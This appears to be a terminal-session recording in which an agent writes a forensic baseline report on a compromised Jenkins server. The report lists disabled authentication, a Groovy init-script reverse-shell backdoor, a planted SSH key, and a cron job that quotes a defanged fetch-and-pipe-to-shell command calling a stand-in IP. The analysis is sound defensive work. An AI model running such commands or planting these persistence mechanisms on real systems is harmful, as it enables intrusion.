[152.372476, "i", "cat <<'EOF' > /app/baseline-report.md\n# Baseline Configuration Assessment Report\n\n## 1. Executive Summary\nA forensic assessment of the system configuration on `/disk` revealed several security baseline misconfigurations that significantly lowered the barrier to initial exploitation and allowed silent persistence.\n\n## 2. Configuration Weakness Findings\n\n### Weakness 1: Jenkins Security Realm Disabled (`useSecurity = false`)\n- **Check ID:** `CHK-06` / `BAS-01` (cited at `/sas/baseline.json:3`, `/sas/alerts.json:23`)\n- **Evidence Path:** `/disk/var/lib/jenkins/config.xml:3`\n- **Configuration Detail:** `useSecurity=false` in `/var/lib/jenkins/config.xml` disables access control and user authentication completely, granting anonymous users full administrator access to the Jenkins controller.\n- **Impact:** Combined with CVE-2024-23897, unauthenticated administrative access allowed the attacker to execute arbitrary Groovy code and drop RCE artifacts without credentials.\n\n### Weakness 2: Unmonitored Groovy Init Scripts Directory\n- **Evidence Path:** `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`\n- **Configuration Detail:** Jenkins automatically executes any `.groovy` script located in `/var/lib/jenkins/init.groovy.d/` upon startup.\n- **Comparison with Benign Script:** File `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:2` is a legitimate maintenance script (`backup.sh --remote 10.10.71`), whereas `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` spawns a reverse shell thread back to `198.51.100.98`.\n- **Impact:** Directory lack of integrity monitoring allowed the attacker to plant persistent startup backdoors silently.\n\n### Weakness 3: Unauthorized SSH Authorized Keys Modification\n- **Evidence Path:** `/disk/var/lib/jenkins/.ssh/authorized_keys:2`\n- **Configuration Detail:** The `jenkins` service user account allowed SSH key-based login without file integrity tracking or key restriction parameters.\n- **Impact:** Attacker placed a backdoor public key (`ssh-ed25519` / `ssh-rsa`) enabling direct persistent SSH access as user `jenkins`.\n\n### Weakness 4: Unsanitized Cron Job Management\n- **Evidence Path:** `/disk/var/spool/cron/crontabs/jenkins:5`\n- **Configuration Detail:** User `jenkins` or `root` crontabs were not audited by integrity monitoring tools.\n- **Impact:** Attacker injected a 1-minute recurring cron job (`* * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh>`) to re-infect the system continuously.\n\n## 3. Baseline Audit Checklist Summary\n| Check ID | Control / Baseline Item | Result | Target File | Citation |\n|---|---|---|---|---|\n| CHK-06 | Jenkins Security Realm (`useSecurity`) | FAIL | `/var/lib/jenkins/config.xml` | `/disk/var/lib/jenkins/config.xml:3` |\n| BAS-CUSTOM-01 | Groovy Init Directory Integrity | FAIL | `/var/lib/jenkins/init.groovy.d/` | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` |\n| BAS-CUSTOM-02 | User SSH Key Restrictions | FAIL | `/var/lib/jenkins/.ssh/authorized_keys` | `/disk/var/lib/jenkins/.ssh/authorized_keys:2` |\n| CHK-05 | System Crontab Integrity | FAIL | `/var/spool/cron/crontabs/jenkins` | `/disk/var/spool/cron/crontabs/jenkins:5` |\nEOF\n"]
[152.372837, "o", "cat <<'EOF' > /app/baseline-report.md"]
